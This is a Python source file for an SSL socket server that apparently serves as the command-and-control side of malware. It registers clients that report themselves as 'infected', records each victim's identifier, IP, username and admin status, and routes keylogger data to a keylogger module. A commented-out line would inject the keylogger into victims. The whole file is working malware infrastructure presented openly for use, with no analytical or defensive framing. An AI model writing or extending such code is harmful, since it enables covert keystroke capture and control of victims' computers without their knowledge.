import asyncio
import ssl
from classes.user import User
from dataManager.dataManager import DataManager
from dataManager.repository.userRepository import UserRepository
import logging
from modules.KeyloggerModule import KeyloggerModule
from modules.Recognizer import Recognizer
from app_state import AppState

class SocketServer:
    def __init__(self, app_state: AppState, host="0.0.0.0", port=4242, certfile='certs/cert.pem', keyfile='certs/key.pem', lock:asyncio.Lock=None):
        self.host = host
        self.port = port
        self.data_manager: DataManager = app_state.data_manager
        self.user_repository: UserRepository = self.data_manager.user_repository
        self.certfile = certfile
        self.keyfile = keyfile
        self.lock = app_state.lock
        self.keylogger = KeyloggerModule(self.user_repository)
        self.recognizer = Recognizer(self.user_repository)

    async def handle_client(self, reader: asyncio.StreamReader, writer : asyncio.StreamWriter):

        ip, port = writer.get_extra_info('peername')

        while True:
            data = await reader.read(4096)
            logging.info("Received data from " + ip + " : " + data.decode())
            service, uuid, params = data.decode().split("|||") 
            message = await self.route(service, uuid, params, reader, writer, ip, port)
            if service == "infected":
                await self.handle_known_client(self.user_repository.get_user(uuid))
                break
            if message == "[close]":
                writer.close()
                await writer.wait_closed()
                break
    
    async def handle_known_client(self, user: User):
        reader = user.reader
        writer = user.writer
        ip = user.ip
        port = user.port
        uuid = user.uuid
        while True:
            async with user.lock:
                logging.info(f"Waiting for data from {ip}")
                data = await reader.read(4096)
                if not data:
                    return "[close]"
            logging.info("Received data from " + ip + " : " + data.decode())
            try:
                service, uuid, params = data.decode().split("|||")
            except ValueError:
                logging.error(f"Invalid data received : {data}")
                continue
            if service == "pause":
                await asyncio.sleep(0.1)
                continue
            message = await self.route(service, uuid, params, reader, writer, ip, port)
            if message == "[close]":
                writer.close()
                await writer.wait_closed()
                break

            

    async def route(self, service, uuid, params, reader, writer, ip, port):
        if service == "infected":
            if uuid in [x["logged"] for x in self.user_repository.get_user_list()]:
                writer.write("exit".encode())
                return "[close]"
            user = User(uuid, ip, port, reader, writer)
            is_admin = await self.recognizer.check_is_admin(reader, writer)
            user.is_admin = is_admin
            user.first_name, user.last_name, user.username = (await self.recognizer.get_username(reader, writer)).values()
            self.user_repository.add_user(user)
            #await self.keylogger.inject(uuid)
        elif service == "keylogger":
            await self.keylogger.action(params, uuid)
            return "[close]"
        else:
            logging.error(f"Unknown service: {service}")

    async def start(self):
        # Create an SSL context
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)

        # Start the server with SSL
        server = await asyncio.start_server(
            self.handle_client, self.host, self.port, ssl=ssl_context
        )
        addr = server.sockets[0].getsockname()
        logging.info(f"Serveur SSL en écoute sur {addr}\n")

        async with server:
            await server.serve_forever()
